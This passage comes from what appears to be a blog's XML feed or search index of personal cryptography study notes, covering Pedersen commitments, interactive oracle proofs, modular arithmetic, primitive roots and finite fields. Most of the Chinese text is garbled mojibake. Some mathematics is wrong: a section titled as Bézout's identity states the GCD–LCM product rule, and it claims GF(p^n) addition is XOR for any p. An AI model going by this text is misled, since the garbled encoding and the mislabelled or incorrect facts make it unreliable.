without knowing what thecommited values actually are.</p><h3 id="åŸºäºæ¤­åœ†æ›²çº¿çš„-pedersen-commitmentt">åŸºäºæ¤­åœ†æ›²çº¿çš„ PedersenCommitmentt</h3><p><strong>Core</strong>: <span class="math display">\[C = r * G + m *H\]</span></p><p>ä¸Šè¿°å…¬å¼ä¸­ï¼ŒC ä¸ºç”Ÿæˆçš„æ‰¿è¯ºå€¼ï¼ŒGã€H ä¸ºç‰¹å®šæ¤­åœ†æ›²çº¿ä¸Šçš„ç”Ÿæˆç‚¹ï¼Œrä»£è¡¨ç€ç›²å› å­ï¼ˆBlinding factorï¼‰ï¼Œm åˆ™ä»£è¡¨ç€åŸå§‹ä¿¡æ¯ã€‚ç”±äº Gã€Hä¸ºç‰¹å®šæ¤­åœ†æ›²çº¿ä¸Šçš„ç”Ÿæˆç‚¹ï¼Œæ‰€ä»¥ r _ Gã€v _ Hå¯ä»¥çœ‹ä½œæ˜¯ç›¸åº”æ›²çº¿ä¸Šçš„å…¬é’¥ï¼ˆrã€v åŒç†ä¹Ÿå¯ä»¥è§†ä¸ºç§é’¥ï¼‰ã€‚</p><p>ç”±äºå¼•å…¥äº†éšæœºç›²å› å­ rï¼Œå¯¹äºåŒä¸€ä¸ª m ä¼šå°±èƒ½äº§ç”Ÿä¸åŒçš„æ‰¿è¯ºcï¼Œå³ä¾¿æ•æ„Ÿéšç§æ•°æ® m ä¸å˜ï¼Œæœ€ç»ˆçš„æ‰¿è¯º C ä¹Ÿä¼šéšç€ rçš„å˜åŒ–è€Œå˜åŒ–ï¼Œå› æ­¤æä¾›äº†ä¿¡æ¯è®ºå®‰å…¨çš„éšåŒ¿æ€§.</p><p>Commitment C(x, a) ) is information-theoretically private becausethere are many possible combinations of m and r that would output thesame C. If r is truly random, an attacker would have literally no way tofigure out m.</p><h2 id="pedersen-commitment-åº”ç”¨">Pedersen Commitment åº”ç”¨</h2><ol type="1"><li><p>æ•°å€¼éšè—</p><p>æ‰¿è¯ºæ–¹éšæœºé€‰æ‹© blinding factor, ç„¶åé€šè¿‡æ„é€ å…³äºæ•°å€¼ valueçš„æ‰¿è¯º.</p></li><li><p>æ’ç­‰å…³ç³»éªŒè¯/éšç§˜äº¤æ˜“</p><p>ä¸»è¦åˆ©ç”¨å…¶åŠ æ€§åŒæ€çš„ç‰¹æ€§</p><p>åªè¦ç¬¬ä¸€ä¸ªæ•°ç­‰äºåä¸¤ä¸ªæ•°ä¹‹å’Œï¼ŒéªŒè¯è€…ä¸ä¼šçœ‹åˆ°äº¤æ˜“é‡å…·ä½“å€¼ï¼Œä½†æ˜¯åˆä¸å¾—ä¸æ‰¿è®¤A çœŸçš„åˆ†äº†ä¸€éƒ¨åˆ†é’±ç»™ Bï¼Œç„¶åè¿˜æœ‰ä¸€éƒ¨åˆ†é’±åˆé€€å›ç»™äº†Aã€‚è¿™æ ·æ—¢éšè—äº†æ•°æ®æœ¬èº«ï¼Œåˆè¯æ˜äº†æ•°æ®çš„å…³ç³»ã€‚è™½ç„¶ Pedersonæ‰¿è¯ºè¯æ˜äº†æ•°å­—ä¹‹é—´çš„å…³ç³»ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰é™åˆ¶ä»»ä½•æ•°å­—çš„å–å€¼åŒºé—´ï¼Œå› æ­¤è¿˜éœ€è¦å¯¹éšè—çš„æ•°å€¼è¿›è¡ŒèŒƒå›´è¯æ˜ï¼</p><p>ref: USENIX2018: zkLedger</p></li></ol><h2 id="ç¼–ç¨‹å‚è€ƒ">ç¼–ç¨‹å‚è€ƒ</h2><p><ahref="https://findora.org/faq/crypto/pedersen-commitment-with-elliptic-curves/">Pedersencommitment (with elliptic curves) - Findora</a></p><p>ä¸¤ä¸ª Python æºç (å¯†ç å­¦åº“: PyCryptodome)</p><ol type="1"><li><p><ahref="https://github.com/EraxterCodes/Pedersen-Commitment-using-Elliptic-Curves/blob/main/Pedersen.py">Pedersen-Commitment-using-Elliptic-Curves/Pedersen.pyat main Â·EraxterCodes/Pedersen-Commitment-using-Elliptic-Curves</a></p></li><li><p><ahref="https://github.com/lorenzogentile404/pedersen-commitment/blob/master/pedersen-commitment.py">pedersen-commitment/pedersen-commitment.pyat master Â· lorenzogentile404/pedersen-commitment</a></p></li></ol><h1 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h1><ol type="1"><li><ahref="https://link.springer.com/content/pdf/10.1007/3-540-46766-1_9.pdf">Non-Interactiveand Information-Theoretic Secure Verifiable Secret Sharing</a></li><li><a href="https://zhuanlan.zhihu.com/p/108659500">å¯†ç å­¦æ‰¿è¯ºä¹‹Pedersen commitment åŸç†åŠåº”ç”¨ - çŸ¥ä¹</a></li><li><a href="https://learnblockchain.cn/article/2096">åŒºå—é“¾ä¸­çš„æ•°å­¦ -Pedersen æ‰¿è¯º | ç™»é“¾ç¤¾åŒº | åŒºå—é“¾æŠ€æœ¯ç¤¾åŒº</a></li><li><ahref="https://crypto.stackexchange.com/questions/66973/pedersen-commitment-in-elliptic-curves">SecurityThought: Pedersen commitment in elliptic curves - Cryptography StackExchange</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Interactive Oracle Proof (IOP)</title>
      <link href="/blog/2023/04/01/crypto/zk/10.iop_kzg/"/>
      <url>/blog/2023/04/01/crypto/zk/10.iop_kzg/</url>
      
        <content type="html"><![CDATA[<h1 id="interactive-oracle-proof-iop">Interactive Oracle Proof(IOP)</h1><h2 id="schwartz-zipple-lemma">Schwartz-Zipple lemma</h2><p>schwartz-zippel lemma state that a polynomial f(x) with degree <spanclass="math inline">\(d\)</span>. There are at most <spanclass="math inline">\(d\)</span> root making f(x)=0. Assume the domainof x is <span class="math inline">\(S\)</span>. The domain S is farbigger than <span class="math inline">\(d\)</span> numbers. Thus, <spanclass="math inline">\(Pr[f(x_0) = 0] \le frac{d}{S}\)</span> withrandomly sampled <span class="math inline">\(x_0\)</span>. TheSchwartz-Zippel lemma turns the problem of proof of knowledge into theproblem of proving the correctness of an evaluation of the polynomial ata random coordinate.</p><h2 id="iop-with-polynomial-commitment">IOP with polynomialcommitment</h2><p>The knowledge can be hidden as coefficients in a polynomial. Then,the zero proof of knowledge can be done by utilizing Schwartz-Zippellemma, which is called IOP protocol. The IOP protocol is idealizedbecause the randomness and the reveal of the evaluation cannot be easilyimplemented in the real world. Luckily, the polynomial commitment withhiding and binding properties can make it. The prover first commits thepolynomial to the verifier. With the binding property, the samecommitment cannot be made without the same polynomial. Then, theverifier randomly chooses a value <spanclass="math inline">\(x_0\)</span> and asks the prover to open thepolynomial commitment at point <span class="math inline">\(x_0\)</span>.With the hiding property, the knowledge of the polynomial can beprotected from leakage in the open stage. If the prover indeed providesa right value of <span class="math inline">\(f(x_0)\)</span>, it hasreason to believe that the prover indeed knows and commits the claimedf(x).</p><p>In summary, the process of the polynomial commitment-basedInteractive Proof of knowledge</p><ol type="1"><li>Alice hides the knowledge in the polynomial by arithmetization</li><li>Alice generates commitment <span class="math inline">\(C\)</span> byevaluating <span class="math inline">\(f(x)\)</span> at the secretcoordinate, and tell Bob</li><li>Bob randomly chooses <span class="math inline">\(x_0\)</span>, andtell Alice &lt;--- Fiat-Shamir Transform: <spanclass="math inline">\(x_0 = hash(C)\)</span></li><li>Alice claimed <span class="math inline">\(y_0\)</span> is theevaluation of <span class="math inline">\(f(x)\)</span> at <spanclass="math inline">\(x_0\)</span> and generates proof for Bob</li><li>Bob verify the proof with the commitment <spanclass="math inline">\(C\)</span>, <spanclass="math inline">\(x_0\)</span>, <spanclass="math inline">\(y_0\)</span></li></ol><p>TODO: -[ ] proof of knowledge vs zero-knowledge proof</p><h2 id="references">References</h2><ol type="1"><li><ahref="https://biquanlibai.notion.site/KZG-Commitment-1-Polynomial-Commitment-02f650f33ddf4765be92cf964ba0ee10">KZGCommitment 1: Polynomial Commitment</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> zero-knowledge proof </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>æ•°è®ºåŸºç¡€</title>
      <link href="/blog/2023/03/30/crypto/math/2.numbers_basic/"/>
      <url>/blog/2023/03/30/crypto/math/2.numbers_basic/</url>
      
        <content type="html"><![CDATA[<h1 id="æ•°è®ºåŸºç¡€">2. æ•°è®ºåŸºç¡€</h1><p>æ¨¡ç®—æœ¯ï¼ˆModular Arithmeticï¼‰æ˜¯æ•°è®ºçš„ä¸€ä¸ªåˆ†æ”¯ï¼Œa ä¸ b æ¨¡ n åŒä½™ï¼š<spanclass="math inline">\(a \equiv b \mod n\)</span>,è¡¨ç¤º a-b = kn, kä¸ºå¤§äºç­‰äº 1 çš„æ•´æ•°ã€‚ a ä¸ b çš„å…³ç³»ç§°åŒä½™å…³ç³»ï¼Œn å«åšæ¨¡æ•°ã€‚</p><p><span class="math inline">\(a+b \equiv c \mod p\)</span>: å¦‚æœ a å’Œ bæ˜¯ä»»æ„çš„æ•´æ•°ï¼Œp æ˜¯ä¸€ä¸ªæ­£æ•´æ•°ï¼Œc æ˜¯ä¸€ä¸ªéè´Ÿæ•´æ•°ï¼Œä¸” (a+b)Ã·p çš„ä½™æ•°ç­‰äºcÃ·p çš„ä½™æ•°.</p><p>å¯¹äºæ¨¡æ•° nï¼Œä¸ a åŒä½™çš„æ‰€æœ‰æ•´æ•°é›†åˆæˆä¸ºåŒä½™ç±» Congruence classï¼Œç”¨<span class="math inline">\(\bar a_{n}\)</span> è¡¨ç¤ºã€‚æ¨¡æ•°è¦æ˜¯æ•´æ•°çš„åŸå› æ˜¯ä¸ºäº†ä¿è¯æ¨¡è¿ç®—çš„è‰¯å¥½æ€§è´¨ï¼Œå¦‚å”¯ä¸€æ€§ã€å°é—­æ€§ã€æ¶ˆå»å¾‹ç­‰</p><h2 id="è´ç¥–ç­‰å¼å®šç†">è´ç¥–ç­‰å¼/å®šç†</h2><p>å¯¹äºä»»æ„ä¸¤ä¸ªå¤§äº 1 çš„æ­£æ•´æ•° a å’Œbï¼Œ<strong>å®ƒä»¬çš„æœ€å¤§å…¬çº¦æ•°ï¼ˆGCDï¼‰ä¸æœ€å°å…¬å€æ•°ï¼ˆLCMï¼‰çš„ä¹˜ç§¯ç­‰äºè¿™ä¸¤ä¸ªæ•°çš„ä¹˜ç§¯</strong>ã€‚å³ï¼š<spanclass="math inline">\(GCD(a,b) * LCM (a,b) = a * b\)</span></p><h2 id="æ¨¡ç®—æœ¯çš„æ€§è´¨">æ¨¡ç®—æœ¯çš„æ€§è´¨</h2><p>æ¨¡è¿ç®—æ»¡è¶³ï¼šåèº«æ€§ï¼Œå¯¹ç§°æ€§ï¼Œä¼ é€’æ€§ï¼ŒåŠ æ³•æ€§ï¼Œå‡æ³•æ€§ï¼Œä¹˜æ³•æ€§ï¼Œé™¤æ³•æ€§ï¼Œå¹‚è¿ç®—æ€§</p><p>å¦‚æœ aâ‰¡b (mod q) ä¸” câ‰¡d (mod q)</p><ul><li>åŠ æ³•æ€§ï¼ša+câ‰¡b+d (mod q)</li><li>å‡æ³•æ€§ï¼ša-câ‰¡b-d (mod q)</li><li>ä¹˜æ³•æ€§ï¼šaÃ—câ‰¡bÃ—d (mod q)ã€‚</li><li>é™¤æ³•æ€§ï¼šå¦‚æœ aâ‰¡b(mod n) ä¸” c å’Œ n äº’ç´ ï¼Œé‚£ä¹ˆ a/c â‰¡ b/c(mod n)ã€‚</li><li>å¹‚è¿ç®—æ€§ï¼šå¦‚æœ aâ‰¡b(mod n)ï¼Œé‚£ä¹ˆå¯¹äºä»»æ„çš„æ­£æ•´æ•° kï¼Œéƒ½æœ‰ <spanclass="math inline">\(a^kâ‰¡b^k(mod n)\)</span>ã€‚</li><li>æ¶ˆå»å¾‹ï¼šå¦‚æœ <span class="math inline">\(ac \equiv bc \mod nï¼Œc \ne0, and gcd(c,n) = 1\)</span>, åˆ™æœ‰ <span class="math inline">\(a \equivb \mod n\)</span></li></ul><p>æ¨¡è¿ç®—çš„é€†è¿ç®—ï¼šæ‰¾åˆ°ä¸€ä¸ªæ•´æ•° bï¼Œä½¿å¾— <span class="math inline">\(ab\equiv 1 \mod n\)</span>ï¼Œå…¶ä¸­ a å’Œ n æ˜¯å·²çŸ¥çš„æ•´æ•°ã€‚è¿™ä¸ªæ•´ æ•° b å°±å«åš aå…³äº n çš„æ¨¡é€†å…ƒã€‚</p><h2 id="å‰©ä½™ç±»-residue-class">å‰©ä½™ç±» (Residue class)</h2><p>è®¾ n &gt; 0, å¯¹äºæ¯ä¸ªæ•´æ•° aï¼Œ å®šä¹‰ï¼š<span class="math inline">\([a] =\{x| x \equiv a \mod n\}\)</span>, [a] æ˜¯æ¨¡ n åŒä½™äº a çš„æ‰€æœ‰æ•´æ•°çš„é›†åˆ,ç§° [a] ä¸º a æ¨¡ n çš„åŒä½™ç±», a æ˜¯ the class representative</p><blockquote><p>In other words, [ğ‘] is the set of all integers that are congruent toğ‘ modulo n. We call [ğ‘] the residue class of ğ‘ modulo ğ‘š. The integer ais called the class representative.</p></blockquote><p>I/(n): æ¨¡ n çš„æ‰€æœ‰åŒä½™ç±»çš„é›†åˆï¼ŒWe denote the set of all residueclasses modulo n by I/(n). ä¾‹å¦‚: <span class="math inline">\(I/(4) = {[0]_4, [1]_4, [2]_4, [3]_4}\)</span> å’Œ <spanclass="math inline">\(I/(n) = { [0]_n, [1]_n, [2]_n, ...,[n-1]_n}\)</span></p><p>æ³¨æ„: I/(n) æ˜¯é›†åˆ(åŒä½™ç±»)çš„é›†åˆ</p><p>ç®€åŒ–å‰©ä½™ç±»(reduced residue class)æ˜¯ m çš„å‰©ä½™ç³»ä¸­ä¸ mäº’ç´ çš„æ•°æ„æˆçš„å­é›†</p><blockquote><p>Since we canâ€™t cancel numbers that arenâ€™t prime to the modulus, wesometimes want to omit these numbers from our complete residue system,and consider only representatives from the various congruence classesthat are relatively prime to m. This is called a <strong>reduced residuesystem</strong> mod m.</p></blockquote><h3 id="znz">Z/nZ</h3><p>The set of congruence classes mod n is called the set of <em>integersmodulo n</em>, and denoted Z/nZ.</p><p>Many authors write Zn for Z/nZ, but this conflicts with othernotation in number theory. (Some people just write Z/n.)</p><p>Warning: the elements of Z/nZ are congruence classes, not integers.Each element is a set of integers. For example, <spanclass="math inline">\(Z/4Z = \{[0]_4, [1]_4, [2]_4, [3]_4\}\)</span>.This is not a subset of Z.</p><h2 id="è´¹é©¬å°å®šç†">è´¹é©¬å°å®šç†</h2><p>å‡å¦‚ a æ˜¯ä¸€ä¸ªæ•´æ•° , p æ˜¯ä¸€ä¸ªè´¨æ•°ï¼Œä¸” gcd(a, p) = 1, é‚£ä¹ˆ <spanclass="math inline">\(a^{p-1} \equiv 1 \mod p\)</span></p><p>è¯æ˜: å¦‚æœ p ä¸ºè´¨æ•°ï¼Œé‚£ä¹ˆä¸€å®šæœ‰ residue class=<spanclass="math inline">\(\{[1]_p,[2]_p,[3]_p,[4]_p,[5]_p,â€¦,[p-1]_p\}\)</span>ï¼Œå› ä¸ºäº’è´¨ï¼Œæ‰€ä»¥éœ€è¦p-1 æ­¥éå†æ‰€æœ‰çš„ç‚¹ï¼Œå°±æ˜¯åœ¨ p-1 æ­¥çš„æ—¶å€™å›åˆ°åŸä½ç½®ï¼Œæ‰€ä»¥<spanclass="math inline">\(a^{p-1} \equiv 1 \mod p\)</span>ã€‚</p><h2 id="æ¬§æ‹‰å®šç†">æ¬§æ‹‰å®šç†</h2><p>å¯¹äºæ­£æ•´æ•° nï¼Œæ¬§æ‹‰å‡½æ•°ï¼ˆEuler's functionï¼‰æ˜¯å°äº n çš„æ­£æ•´æ•°ä¸­ä¸ näº’è´¨çš„æ•°çš„ä¸ªæ•°ã€‚é€šå¸¸è¡¨ç¤ºä¸º <spanclass="math inline">\(\varphi(n)\)</span>.å…¶æœ‰å¯¹åº”çš„è®¡ç®—å‡½æ•°ï¼ˆå¤æ‚ç•¥è¿‡ï¼‰ï¼Œä¸‰ä¸ªå¸¸ç”¨æ€§è´¨ï¼š</p><ol type="1"><li>å¦‚æœ n ä¸ºè´¨æ•°ï¼Œ<span class="math inline">\(\varphi(n) =n-1\)</span></li><li>å¦‚æœ m, n äº’è´¨ï¼Œåˆ™ <span class="math inline">\(\varphi(mn) =\varphi(m)\varphi(n)\)</span></li><li>å¦‚æœ p æ˜¯ä¸€ä¸ªè´¨æ•°ï¼Œk æ˜¯å¤§äºç­‰äº 1 çš„æ­£æ•´æ•°ï¼Œåˆ™ <spanclass="math inline">\(\varphi(p^k) = p^{k-1}\varphi(p) =p^{k-1}*(p-1)\)</span></li></ol><h2 id="æ¨¡-n-çš„æœ¬åŸæ ¹-prime-rootprimitive-rootprimitive-element">æ¨¡ nçš„(æœ¬)åŸæ ¹ prime rootã€primitive rootã€primitive element</h2><p>a number g is a primitive root modulo n if every number a coprime ton is congruent to a power of g modulo n. In formula, <spanclass="math inline">\(m \equiv g^i mod n\)</span>, <spanclass="math inline">\(m \in \{m|gcd(m,n) = 1\}\)</span></p><p>å¯¹äºæ¨¡æ•° n çš„æ¯ä¸ªäº’è´¨æ•° aï¼Œéƒ½å­˜åœ¨ä¸€ä¸ªæ•´æ•° k æ»¡è¶³ï¼š<spanclass="math inline">\(g^k \equiv a \mod n\)</span>, ç§° g ä¸ºæ¨¡ nçš„åŸæ ¹ã€‚g, as a primitive root modulo n, is also called the generator ofthe multiplicative group of integers modulo n.</p><p>ä¸æ˜¯æ¯ä¸ªæ•°éƒ½æœ‰åŸæ ¹ï¼Œ åªæœ‰å½“ n ç­‰äº 2,4,p<sup>k,2p</sup>k, å…¶ä¸­ pä¸ºå¥‡è´¨æ•°æ—¶ï¼Œn æ‰æœ‰åŸæ ¹ã€‚æ‰€ä»¥å¯¹åº”ç¾¤è®ºï¼Œå¹¶ä¸æ˜¯æ‰€æœ‰çš„æœ‰é™ n é˜¶ç¾¤åœ¨æ¨¡ nç®—æ•°ä¸‹éƒ½å¯ä»¥å½¢æˆå¾ªç¯ç¾¤ã€‚[^1]</p><p>å¯¹äº n ä¸ºç´ æ•°çš„æƒ…å†µï¼ŒFor prime n, g is a primitive root of prime n ifand only if the results of g^i mod n is distinct and congruent to[1,n-1], which is congruent to n, i in [1, phi(n)=n-1]. that is <spanclass="math inline">\(g^1, g^2,...g^{n-1}\)</span> are distinct andequals to [1,n-1].</p><p>Why prime root is called generatorï¼Ÿ</p><p>The relevant (and cool) fact is this: if ğ‘” is a primitive root moduloğ‘› (so that ğ‘” has multiplicative order ğœ™(ğ‘›) modulo ğ‘›), then every integerin the world that is relatively prime to ğ‘› is congruent modulo ğ‘› to somepower of ğ‘”. In other words, the powers of ğ‘” "generate" the entire set ofreduced residue classes modulo ğ‘›. (In terms of groups: themultiplicative group of reduced residue classes modulo ğ‘› is cyclic, andğ‘” is a generator for that cyclic group.)</p><p>åŸæ ¹ç”Ÿæˆäº†æ‰€æœ‰ä¸ näº’ç´ çš„æ•°çš„é›†åˆï¼Œä¹Ÿå°±æ˜¯ç®€åŒ–å‰©ä½™ç±»ï¼Œç®€åŒ–å‰©ä½™ç±»çš„å…ƒç´ å¯ä»¥ç»„æˆä¹˜æ³•ç¾¤ï¼Œä»è€ŒåŸæ ¹å°±æ˜¯ç”Ÿæˆå…ƒ,è€Œä¸”æ˜¯å¾ªç¯ç¾¤çš„ç”Ÿæˆå…ƒï¼Œä¹Ÿå°±æ˜¯å¯ä»¥é€šè¿‡åŸæ ¹ä¸€ä¸ªå…ƒç´ ç”Ÿæˆæ•´ä¸ªå¾ªç¯ç¾¤ã€‚</p><h2 id="ç¾¤çš„ç”Ÿæˆå…ƒ">ç¾¤çš„ç”Ÿæˆå…ƒ</h2><blockquote><p>a generating set of a group is a subset of the group set such thatevery element of the group can be expressed as a combination (under thegroup operation) of finitely many elements of the subset and theirinverses.</p></blockquote><p>Generating set of a group ç”Ÿæˆå…ƒé›†åˆ (g_1,...,g_n)æ˜¯ç¾¤å…ƒç´ çš„é›†åˆï¼Œå¯¹äºå¾ªç¯ç¾¤æ¥è¯´ï¼Œä¸€ä¸ªç”Ÿæˆå…ƒä¾¿å¯ç”Ÿæˆæ•´ä¸ªç¾¤ï¼Œè¯¥ç”Ÿæˆå…ƒå³ä¸ºæ¨¡nçš„åŸæ ¹ã€‚å¯¹äºå…¶ä»–éå¾ªç¯çš„æœ‰é™ç¾¤æ¥è¯´ï¼Œå­˜åœ¨ç”Ÿæˆå…ƒï¼Œä½†ä¸å­˜åœ¨å¯ä»¥å•ç‹¬ç”Ÿæˆæ•´ä¸ªç¾¤çš„ä¸€ä¸ªç”Ÿæˆå…ƒã€‚é€šè¿‡ç”Ÿæˆå…ƒé›†åˆç”Ÿæˆæœ‰é™ç¾¤ã€‚</p><blockquote><p>A set of generators (g_1,...,g_n) is a set of group elements that canbe used to generate all the elements in the group through repeatedapplication of the generators and their inverses. Cyclic groups can begenerated as powers of a single generator, but for all other groups,you'll need more than one generator.</p></blockquote><h1 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h1><ol type="1"><li><ahref="https://chenliang.org/2021/02/25/foundations-of-number-theory/">å¯†ç å­¦-01-æ•°è®ºåŸºç¡€Â· é™ˆäº®çš„ä¸ªäººåšå®¢</a></li><li><ahref="https://math.libretexts.org/Bookshelves/Combinatorics_and_Discrete_Mathematics/Elementary_Number_Theory_%28Barrus_and_Clark%29/01%3A_Chapters/1.21%3A_Residue_Classes_and_the_Integers_Modelo_m">1.21:Residue Classes and the Integers Modelo m - MathematicsLibreTexts</a></li><li><ahref="https://courses.smp.uq.edu.au/MATH2301/Chapter2.pdf">Ghostscriptwrapper for C:and Settings.DOMATHSDropbox\2301\2010__2301.pdf</a></li><li><a href="https://solitaryroad.com/c304.html">Congruence, residueclasses of integers modulo m</a></li><li><a href="https://mathworld.wolfram.com/GroupGenerators.html">GroupGenerators -- from Wolfram MathWorld</a></li></ol><ul class="task-list"><li><label><input type="checkbox" />6. <ahref="https://www.youtube.com/watch?v=DKy98FWHwdg">Primitive Roots -YouTube</a></label></li></ul><ol start="7" type="1"><li>[^1]<ahref="http://ramanujan.math.trinity.edu/rdaileda/teach/f20/m3341/lectures/lecture16_slides.pdf">PrimitiveRoots Modulo Prime Powers</a></li><li><ahref="https://math.stackexchange.com/questions/2191852/why-are-primitive-roots-called-generators">elementarynumber theory - Why are primitive roots called generators? - MathematicsStack Exchange</a></li><li><ahref="https://math.berkeley.edu/~mcivor/math115su12/lectures/lecture5.pdf">berkeleymcivor's math lecture5.pdf</a></li><li><ahref="https://en.wikipedia.org/wiki/Generating_set_of_a_group">Generatingset of a group - Wikipedia</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>4. æœ‰é™åŸŸè¿ç®—ä»¥åŠä»£ç ç†è§£</title>
      <link href="/blog/2023/03/30/crypto/math/4.%20finite_field_operations/"/>
      <url>/blog/2023/03/30/crypto/math/4.%20finite_field_operations/</url>
      
        <content type="html"><![CDATA[<h1 id="æœ‰é™åŸŸè¿ç®—ä»¥åŠä»£ç ç†è§£">4. æœ‰é™åŸŸè¿ç®—ä»¥åŠä»£ç ç†è§£</h1><p>æœ¬æ–‡ä¸»è¦è®²è§£æœ‰é™åŸŸä¸Šçš„åŠ å‡ä¹˜é™¤ä»¥åŠæœ‰é™åŸŸä¸Šå¤šé¡¹å¼çš„åŠ å‡ä¹˜é™¤è¿ç®—ä»¥åŠå¯¹åº”python ä»£ç ç†è§£ã€‚</p><h2 id="æœ‰é™åŸŸä¸Šçš„åŠ æ³•ç»“æ„">æœ‰é™åŸŸä¸Šçš„åŠ æ³•ç»“æ„</h2><p>å¤šé¡¹å¼é™¤æ³• GF(2^8)ä¸»è¦çœ‹ï¼š<ahref="https://abcdxyzk.github.io/blog/2018/04/16/isal-erase-3/">ä¼½ç½—ååŸŸï¼ˆGaloisFieldï¼‰ä¸Šçš„å››åˆ™è¿ç®— - kk Blog â€”â€” é€šç”¨åŸºç¡€</a></p><p><ahref="https://github.com/Antalpha-Labs/zkp-co-learn/discussions/34">æœ‰é™åŸŸä¸‹å¤šé¡¹å¼è®¡ç®—çš„æœ‰å…³å›°æƒ‘Â· Antalpha-Labs/zkp-co-learn Â· Discussion #34</a></p><p>https://blog.csdn.net/suoluo_2020/article/details/119618283</p><p>GF(p^n)æœ‰ä¸‰ç§è¡¨ç¤ºå½¢å¼ï¼Œ<ahref="https://zhuanlan.zhihu.com/p/161411524">ä¿¡é“ç¼–ç ç³»åˆ—(ä¸‰)ï¼šä¼½ç½—ååŸŸ(GaloisFields) - çŸ¥ä¹</a></p><p><span class="math inline">\(GF(p^n)\)</span>ä¸­çš„å…ƒç´ å¯ä»¥ç”¨å¤šé¡¹å¼çš„å½¢å¼è¡¨ç¤ºï¼Œä¾‹å¦‚ GF(25) ä¸­çš„å…ƒç´ å¯ä»¥ç”¨ä¸€ä¸ªå°äº 5æ¬¡çš„å¤šé¡¹å¼è¡¨ç¤ºï¼Œä¾‹å¦‚ x4 + x^3 + 11ã€‚GF(p^n)ä¸­çš„åŠ æ³•å’Œå‡æ³•éƒ½æ˜¯æŒ‰ä½å¼‚æˆ–ï¼Œä¹˜æ³•å’Œé™¤æ³•éƒ½æ˜¯æŒ‰ç…§ä¸€ä¸ªç»™å®šçš„ç´ å¤šé¡¹å¼æ¥è¿›è¡Œæ¨¡è¿ç®—123ã€‚GF(p^n)åœ¨å¯†ç å­¦å’Œçº é”™ç ä¸­æœ‰é‡è¦çš„åº”ç”¨ã€‚</p><p>GF(p^n) æ˜¯ GF(p) çš„æ‰©åŸŸï¼ŒGF(p)çš„å…ƒç´ éƒ½æ˜¯æ•´ï¼Œä»æ•°æ‰©å±•åˆ°å¤šé¡¹å¼ï¼Œæ„é€ ä¸€ä¸ªä»£æ•°ç»“æ„æ»¡è¶³åŸŸçš„æ€§è´¨ï¼Œä¸ºæ»¡è¶³åŸŸçš„æ€§è´¨ï¼Œè§„å®šè¿™äº›è¿ç®—æ¡ä»¶ã€‚</p><p>GF(p^n)ï¼Œç³»æ•°æ¨¡ p, å› ä¸ºç³»æ•°æ¨¡ pï¼Œæ‰€ä»¥å¤šé¡¹å¼åŠ æ³•è‚¯å®šè¿˜å±äº GF(p^n)å¤šé¡¹å¼ä¹˜æ³•åˆ™æœ‰å¯èƒ½å‡ºç°æ›´é«˜æ¬¡é¡¹ï¼Œæ‰€ä»¥æ¨¡ä¸€ä¸ªç´ å¤šé¡¹å¼ï¼Œå› æ­¤ç»“æœä¹Ÿå±äºGF(p^n)</p><p>GF(2^p)çš„å¤šé¡¹å¼æ¨¡è¿ç®—å’Œ 2.2 èŠ‚ä¸­è®²è¿°çš„ GF(2)è¿ç®—ååˆ†æ¥è¿‘ï¼Œåªæ¯”å…¶å¤šäº†ä¸€æ¡è§„åˆ™ï¼šå¤šé¡¹å¼ä¹˜æ³•å¾—åˆ°çš„ç»“æœéœ€è¦è¿›è¡Œæ¨¡ m(x)è¿ç®—ï¼Œè¿™æ˜¯ä¸ºäº†å°†å¤šé¡¹å¼çš„ç»“æœé™åˆ¶åœ¨é›†åˆ Sä¸­ï¼Œä¸‹é¢ç”¨ä¾‹å­æ¥ä»‹ç»ä¸€ä¸‹å¤šé¡¹å¼æ¨¡è¿ç®—ã€‚</p><p>TODO</p><ul><li>[]</li></ul><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><ol type="1"><li><ahref="https://kyrita.top/number/math/%e6%9c%89%e9%99%90%e5%9f%9f-md/#">æœ‰é™åŸŸ-GaloisFields</a></li><li><a href="http://stuyang.com/blog/763a052576b9/">ã€å¯†ç å­¦åŸºç¡€ã€‘05æœ‰é™åŸŸ | Yang's blog</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Cryptography </category>
          
          <category> math </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>é›¶çŸ¥è¯†è¯æ˜ä»‹ç»</title>
      <link href="/blog/2023/03/30/crypto/zk/0.zk_intro2/"/>
      <url>/blog/2023/03/30/crypto/zk/0.zk_intro2/</url>
      
